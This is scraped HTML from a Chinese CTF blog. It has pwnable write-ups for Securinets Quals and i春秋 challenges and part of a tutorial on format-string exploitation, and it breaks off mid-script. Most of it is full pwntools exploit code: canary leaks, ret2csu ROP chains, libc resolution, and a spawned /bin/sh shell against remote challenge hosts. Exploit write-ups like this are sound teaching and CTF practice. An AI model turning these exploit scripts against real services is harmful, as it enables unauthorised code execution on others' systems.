<p>64位程序，一个基本栈溢出，由于没有给出动态库，可以配合pwntools的DynELF模块泄露system函数地址，也可以随便泄露一个地址再匹配动态库，再计算出system函数地址。<br>直接放exp:<br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">a=remote(<span class="string">"51.254.114.246"</span>,1111)</span><br><span class="line">elf=ELF(<span class="string">"./baby1"</span>)</span><br><span class="line">write_got=elf.got[<span class="string">"write"</span>]</span><br><span class="line">start_addr=0x400500</span><br><span class="line">def leak(addr):</span><br><span class="line">    a.recvuntil(<span class="string">"Welcome to securinets Quals!\n"</span>)</span><br><span class="line">    payload='A'*56</span><br><span class="line">    payload+=p64(0x0000000004006BA)<span class="comment">#csu</span></span><br><span class="line">    payload+=p64(0)</span><br><span class="line">    payload+=p64(1)</span><br><span class="line">    payload+=p64(write_got)</span><br><span class="line">    payload+=p64(8)</span><br><span class="line">    payload+=p64(addr)</span><br><span class="line">    payload+=p64(1)</span><br><span class="line">    payload+=p64(0x0000000004006A0)<span class="comment">#csu </span></span><br><span class="line">    payload+='A'*56</span><br><span class="line">    payload+=p64(start_addr)</span><br><span class="line">    a.sendline(payload)</span><br><span class="line">    return a.recv(8)</span><br><span class="line">d=DynELF(leak,elf=elf)</span><br><span class="line">system_addr=d.lookup(<span class="string">"system"</span>,<span class="string">"libc"</span>)</span><br><span class="line">log.info(<span class="string">"system_addr = 0x%x"</span>%(system_addr));</span><br><span class="line"></span><br><span class="line">read_got=elf.got[<span class="string">"read"</span>]</span><br><span class="line">def exp():</span><br><span class="line">    a.recvuntil(<span class="string">"Welcome to securinets Quals!\n"</span>)</span><br><span class="line">    payload='A'*56</span><br><span class="line">    payload+=p64(0x0000000004006BA)<span class="comment">#csu</span></span><br><span class="line">    payload+=p64(0)</span><br><span class="line">    payload+=p64(1)</span><br><span class="line">    payload+=p64(read_got)</span><br><span class="line">    payload+=p64(10)</span><br><span class="line">    payload+=p64(elf.bss())</span><br><span class="line">    payload+=p64(0)</span><br><span class="line">    payload+=p64(0x0000000004006A0)<span class="comment">#csu </span></span><br><span class="line">    payload+='A'*56</span><br><span class="line">    payload+=p64(0x00000000004006c3)</span><br><span class="line">    payload+=p64(elf.bss())</span><br><span class="line">    payload+=p64(system_addr)</span><br><span class="line">    a.sendline(payload)</span><br><span class="line">    sleep(0.1)</span><br><span class="line">    a.sendline(<span class="string">"/bin/sh"</span>)</span><br><span class="line">    a.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/08/i春秋pwnable-writeup/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ditto">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/my.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ditto's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/03/08/i春秋pwnable-writeup/" itemprop="url">i春秋pwnable-writeup</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-08T22:15:13+08:00">
                2019-03-08
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  842
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  4
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h4 id="easypwn"><a href="#easypwn" class="headerlink" title="easypwn"></a>easypwn</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x40</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Hello!I am the smartest robot in the universe!\nWho are you?"</span>);</span><br><span class="line">  fflush(_bss_start);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">"Your name %s sounds so stupid!\nBut you don't looks like a fool,isn't it?\nso why don't tell me your real name?\n"</span>,</span><br><span class="line">    &amp;buf);</span><br><span class="line">  fflush(_bss_start);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Oh!This one is better,nice to meet you!\nGoodbye!See you again!"</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>64位程序，开启了canary和nx防护。<br>利用思路如下：<br>1.通过第一次的输入，覆盖canary高位的第一个字节为\x0a,利用printf中的%s，将canary的值打印出来。<br>2.由于题目没有给出动态库。可以通过puts泄露got表项内容，通过比对获知目标机器使用的动态库，或者写leak函数，结合pwntools的DynELF，泄露库中函数地址。<br>3.通过第二次溢出，构造ROPchain，利用read读取/bin/sh到bss段，接着调用system，获取shell。<br>完整的exp如下：<br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python </span></span><br><span class="line">from pwn import *</span><br><span class="line"><span class="comment">#context.log_level="debug"</span></span><br><span class="line">a=remote(<span class="string">"106.75.2.53"</span>,10002)</span><br><span class="line">elf=ELF(<span class="string">"./easypwn"</span>)</span><br><span class="line">pop_rdi_ret=0x4007f3 <span class="comment">#pop rdi ret</span></span><br><span class="line">def leak(addr):</span><br><span class="line">    a.recvuntil(<span class="string">"Who are you?\n"</span>)</span><br><span class="line">    payload='A'*72</span><br><span class="line">    a.sendline(payload)</span><br><span class="line">    a.recvuntil(<span class="string">"A"</span>*72)</span><br><span class="line">    canary=u64(a.recv(8))-0xa</span><br><span class="line">    a.recv()</span><br><span class="line">    payload='A'*72+p64(canary)</span><br><span class="line">    payload+='B'*8 <span class="comment"># fake rbp</span></span><br><span class="line">    payload+=p64(pop_rdi_ret)</span><br><span class="line">    payload+=p64(addr)</span><br><span class="line">    payload+=p64(elf.plt[<span class="string">"puts"</span>])</span><br><span class="line">    payload+=p64(0x4005D0)<span class="comment"># start address</span></span><br><span class="line">    a.sendline(payload)</span><br><span class="line">    a.recvuntil(<span class="string">"Oh!This one is better,nice to meet you!\nGoodbye!See you again!\n"</span>)</span><br><span class="line">    data=<span class="string">""</span></span><br><span class="line">    up=<span class="string">""</span></span><br><span class="line">    while True:</span><br><span class="line">        c=a.recv(1)</span><br><span class="line">        if up==<span class="string">"\n"</span> and c ==<span class="string">"H"</span>:</span><br><span class="line">            data=data[:-1]</span><br><span class="line">            data=data+<span class="string">"\x00"</span></span><br><span class="line">            break</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            data+=c</span><br><span class="line">        up=c</span><br><span class="line">    return data[:4]</span><br><span class="line"></span><br><span class="line">d=DynELF(leak,elf=elf)</span><br><span class="line">system_addr=d.lookup(<span class="string">"system"</span>,<span class="string">"libc"</span>)</span><br><span class="line"><span class="comment">#libc=LibcSearcher("system",system_addr)</span></span><br><span class="line">print(<span class="string">"system_addr = "</span>+hex(system_addr))</span><br><span class="line">read_got=elf.got[<span class="string">"read"</span>]</span><br><span class="line">a.recvuntil(<span class="string">"Who are you?\n"</span>)</span><br><span class="line">payload='A'*72</span><br><span class="line">a.sendline(payload)</span><br><span class="line">a.recvuntil(<span class="string">"A"</span>*72)</span><br><span class="line">canary=u64(a.recv(8))-0xa</span><br><span class="line">a.recv()</span><br><span class="line"><span class="comment">#ret2csu</span></span><br><span class="line">payload='A'*72</span><br><span class="line">payload+=p64(canary)</span><br><span class="line">payload+='B'*8</span><br><span class="line">payload+=p64(0x4007EA)</span><br><span class="line">payload+=p64(0)</span><br><span class="line">payload+=p64(1)</span><br><span class="line">payload+=p64(read_got)</span><br><span class="line">payload+=p64(10)</span><br><span class="line">payload+=p64(0x0000000000601060)</span><br><span class="line">payload+=p64(0)</span><br><span class="line">payload+=p64(0x00000000004007D0)</span><br><span class="line">payload+='A'*56</span><br><span class="line">payload+=p64(pop_rdi_ret)</span><br><span class="line">payload+=p64(0x0000000000601060)</span><br><span class="line">payload+=p64(system_addr)</span><br><span class="line">payload+=p64(pop_rdi_ret)</span><br><span class="line"></span><br><span class="line">a.sendline(payload)</span><br><span class="line">sleep(0.1)</span><br><span class="line">a.sendline(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">a.interactive()</span><br></pre></td></tr></table></figure></p>
<h4 id="pwnme"><a href="#pwnme" class="headerlink" title="pwnme"></a>pwnme</h4><p>程序中存在格式化串漏洞，栈溢出，整型溢出。做法有多种。</p>
<p>这里存在格式化串漏洞：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">sub_400AD1</span><span class="params">(<span class="keyword">char</span> format, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6, <span class="keyword">char</span> formata, __int64 a8, __int64 a9)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(&amp;formata);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;a9 + <span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这里有整数溢出：<br><img src="/2019/03/08/i春秋pwnable-writeup/2.png" alt=""><br>由于char是8位，则输入的字节个数超过256即可绕过</p>
<p>这里有栈溢出：<br><img src="/2019/03/08/i春秋pwnable-writeup/1.png" alt=""><br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *__<span class="function">fastcall <span class="title">sub_400A90</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x14</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">memcpy</span>(&amp;s, a1, a2);#溢出了</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这里单独使用栈溢出来做。<br>完整exp如下：<br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"><span class="comment">#a=process("./pwnme")</span></span><br><span class="line">a=remote(<span class="string">"106.75.2.53"</span>,<span class="string">"10006"</span>)</span><br><span class="line">offset=40</span><br><span class="line">elf=ELF(<span class="string">"./pwnme"</span>)</span><br><span class="line">puts_plt=elf.plt[<span class="string">"puts"</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">"puts"</span>]</span><br><span class="line">pop_rdi_ret=0x400ed3</span><br><span class="line">length=260</span><br><span class="line">def init():</span><br><span class="line">    a.recvuntil(<span class="string">"Input your username(max lenth:40): \n"</span>)</span><br><span class="line">    a.sendline(<span class="string">"a"</span>)</span><br><span class="line">    a.recvuntil(<span class="string">"Input your password(max lenth:40): \n"</span>)</span><br><span class="line">    a.sendline(<span class="string">"a"</span>)</span><br><span class="line">    a.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">    a.sendline(<span class="string">"2"</span>)</span><br><span class="line">    a.recvuntil(<span class="string">"please input new username(max lenth:20): \n"</span>)</span><br><span class="line">    a.sendline(<span class="string">"a"</span>)</span><br><span class="line">    a.recvuntil(<span class="string">"please input new password(max lenth:20): \n"</span>)</span><br><span class="line"></span><br><span class="line">init()</span><br><span class="line">payload='A'*40</span><br><span class="line">payload+=p64(pop_rdi_ret)</span><br><span class="line">payload+=p64(puts_got)</span><br><span class="line">payload+=p64(puts_plt)</span><br><span class="line">payload+=p64(0x400770)<span class="comment">#start_addr</span></span><br><span class="line">payload+='A'*(length-len(payload))</span><br><span class="line">a.sendline(payload)</span><br><span class="line">puts_addr=u64(a.recvuntil(<span class="string">"\n"</span>,drop=True).ljust(8,<span class="string">"\x00"</span>))</span><br><span class="line">print <span class="string">"puts_addr = "</span>+ str(hex(puts_addr))</span><br><span class="line">init()</span><br><span class="line">libc=LibcSearcher(<span class="string">"puts"</span>,puts_addr)</span><br><span class="line">system_addr=puts_addr-libc.dump(<span class="string">"puts"</span>)+libc.dump(<span class="string">"system"</span>)</span><br><span class="line">bin_sh=puts_addr-libc.dump(<span class="string">"puts"</span>)+libc.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line">print hex(system_addr)</span><br><span class="line">read_got=elf.got[<span class="string">"read"</span>]</span><br><span class="line">payload='A'*40</span><br><span class="line">payload+=p64(0x400eca)</span><br><span class="line">payload+=p64(0)</span><br><span class="line">payload+=p64(1)</span><br><span class="line">payload+=p64(read_got)</span><br><span class="line">payload+=p64(10)</span><br><span class="line">payload+=p64(elf.bss())</span><br><span class="line">payload+=p64(0)</span><br><span class="line">payload+=p64(0x400eb0)</span><br><span class="line">payload+='A'*56</span><br><span class="line">payload+=p64(pop_rdi_ret)</span><br><span class="line">payload+=p64(elf.bss())</span><br><span class="line">payload+=p64(system_addr)</span><br><span class="line">payload+=p64(0x400770)</span><br><span class="line">payload+='A'*(length-len(payload))</span><br><span class="line">a.sendline(payload)</span><br><span class="line">sleep(0.1)</span><br><span class="line">a.sendline(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">a.interactive()</span><br></pre></td></tr></table></figure></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/02/22/格式化串漏洞利用总结/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ditto">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/my.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ditto's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/02/22/格式化串漏洞利用总结/" itemprop="url">格式化串漏洞利用总结</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-02-22T19:43:00+08:00">
                2019-02-22
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  4.1k
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  17
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p>这篇笔记总结下格式化字符串漏洞的利用。看之前需要对基本格式化字符串漏洞原理有所了解，在先前的笔记中已有。<br>格式化字符串漏洞的利用，往往就两点：泄露内存，修改内存。泄露内存可以泄露栈上数据，如 saved ebp/rbp , 返回地址，还有函数的got表项内容。修改内存可以修改got表项内容，返回地址，变量的值等等。还可以利用他来写ROP等。</p>
<h3 id="预备知识："><a href="#预备知识：" class="headerlink" title="预备知识："></a>预备知识：</h3><ol>
<li>%x:   他可以将对应参数的值以16进制打印出来，<strong>%x只能打印4个字节，%lx或者%llx可以打8个字节</strong>。如%x表示要泄漏对应偏移4字节长度的16进制数据，%llx表示要泄漏对应偏移8字节长度的16进制数据。</li>
<li>%s：可以打印<strong>对应参数所指向的字符串</strong>。</li>
<li>%n:  可以修改对应参数（这个参数是指针）所指向的变量的值为%n之前打印的字符的个数，如果是32位程序，则这个指针变量为4字节，64位程序这个指针变量为8字节，这是因为不同位数，地址的长度不同。<strong>还要注意%n是修改对应参数指向的地址起，4字节长度的空间。，%hn，是修改2字节的地址空间，%hhn是1字节的地址空间，%lln是修改8字节的地址空间。</strong><br><strong>像修改地址这样的大数据，如果一次输出太多的字节可能会引起程序崩溃，则可以利用%hn，%hhn来一部分一部分的写入，下面修改内存部分会讲到。</strong></li>
</ol>
<h3 id="泄露内存："><a href="#泄露内存：" class="headerlink" title="泄露内存："></a>泄露内存：</h3><h4 id="泄露got表项内容："><a href="#泄露got表项内容：" class="headerlink" title="泄露got表项内容："></a>泄露got表项内容：</h4><p>   泄露内存可以泄露程序中使用过的函数的got表项的内容，得到该函数的地址。但是在64位程序中，往往会被\x00给截断。。因为64位程序中，很多地址的高位是00，但是在32位程序中不会，这就需要将地址写在格式化串的末尾。<br>   如果已知目标程序使用的libc库，就可以计算出system函数的地址，<br>   如果题目没有给出目标程序使用的libc库，则可以多泄露几个函数的地址，通过 <a href="http://libcdb.com/" target="_blank" rel="noopener">http://libcdb.com/</a> 来获知目标程序使用的libc库，然后再计算出system函数的地址。也可以使用这个python的库<a href="https://github.com/lieanu/LibcSearcher" target="_blank" rel="noopener">https://github.com/lieanu/LibcSearcher</a> 来获知目标程序使用的动态库，原理都是一样的：ASLR不会随机化地址的后12bit。<br>具体计算方法是:<br><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">libc_base</span> = 泄露函数的地址 - 其在libc库中的偏移(libc.symbols[<span class="string">"函数名"</span>])</span><br><span class="line"><span class="attr">system_address</span> = libc_base + system在库中的偏移(libc.symbols[<span class="string">"system"</span>])</span><br></pre></td></tr></table></figure></p>
<p> 出现格式化串漏洞的时候，程序往往是这样的：</p>
<pre><code>char a[50];
read(0,a,50);
printf(a);
</code></pre><p>则你输入的字符串是保存在栈中的（后面会讨论格式化串不在栈中的情况，如在bss段或者堆中），然后你调用printf函数，此时printf函数的堆栈是在原先函数堆栈的低地址处，所以printf可以找到字符串的空间。<br>如图：<br><img src="/2019/02/22/格式化串漏洞利用总结/1.png" alt=""><br>例如可以得到这样的结果：<br><img src="/2019/02/22/格式化串漏洞利用总结/2.png" alt=""><br>可以看到AAAA在格式化串偏移7位置处。<br>如果将第七个%x，换成%s，那就将打印0x41414141这个地址指向的字符串了。很可能这不是一个有效的字符串地址，换成%s，会出现段错误。<br>如果将AAAA换成有效的字符串地址，则将字符串打印出来。</p>
<p>写个例子，分别讨论下32位和64位。</p>
<h5 id="32位程序："><a href="#32位程序：" class="headerlink" title="32位程序："></a>32位程序：</h5><p> 源代码如下：<br> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fsb</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>,<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">char</span> a[<span class="number">100</span>];</span><br><span class="line">  read(<span class="number">0</span>,a,<span class="number">100</span>);</span><br><span class="line">  <span class="built_in">printf</span>(a);</span><br><span class="line">  <span class="built_in">memset</span>(a,<span class="number">0</span>,<span class="keyword">sizeof</span>(a));</span><br><span class="line">  read(<span class="number">0</span>,a,<span class="number">0x500</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  fsb();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>编译时关闭了canary和pie保护：<br> <code>gcc -m32 demo.c -fno-stack-protector -no-pie -g -o demo</code><br> 这里的setbuf函数是关闭输出缓冲区，防止远程打的时候，没有输出。<br> 题目的思路如下：<br> 使用格式化串漏洞随便泄露一个函数的got表项内容，结合libc库，计算出libc的基地址，接着计算出system函数的地址。<br> 此时格式化串的构造方式为：<br> <code>payload=p32(函数got表项的地址)+ %offset$s</code><br> offset怎么计算，可以看看格式化串漏洞的基本原理。<br> 这样就可以将got表项的内容打印出来，计算出system函数的地址后，简单的rop，即可得到shell，完整exp如下：<br> <figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line">from pwn import *</span><br><span class="line">a=process(<span class="string">"./demo"</span>)</span><br><span class="line">elf=ELF(<span class="string">"./demo"</span>)</span><br><span class="line">libc=ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line">offset=7</span><br><span class="line"></span><br><span class="line">read_got=elf.got[<span class="string">"read"</span>]</span><br><span class="line">payload=p32(read_got)+<span class="string">"%7$s"</span> <span class="comment">#格式化串</span></span><br><span class="line">a.send(payload)</span><br><span class="line">read_addr=u32(a.recv(8)[4:8]) <span class="comment">#接受read函数的地址</span></span><br><span class="line"></span><br><span class="line">system_addr=read_addr-libc.symbols[<span class="string">"read"</span>]+libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">pop3ret = 0x8048619 </span><br><span class="line">payload='A'*112 <span class="comment">#padding</span></span><br><span class="line">payload+=p32(read_addr) <span class="comment">#read函数将/bin/sh读入bss段</span></span><br><span class="line">payload+=p32(pop3ret)</span><br><span class="line">payload+=p32(0)</span><br><span class="line">payload+=p32(elf.bss())</span><br><span class="line">payload+=p32(10)</span><br><span class="line">payload+=p32(system_addr)</span><br><span class="line">payload+=p32(pop3ret)</span><br><span class="line">payload+=p32(elf.bss())</span><br><span class="line"></span><br><span class="line">a.sendline(payload)</span><br><span class="line">sleep(0.1)</span><br><span class="line">a.sendline(<span 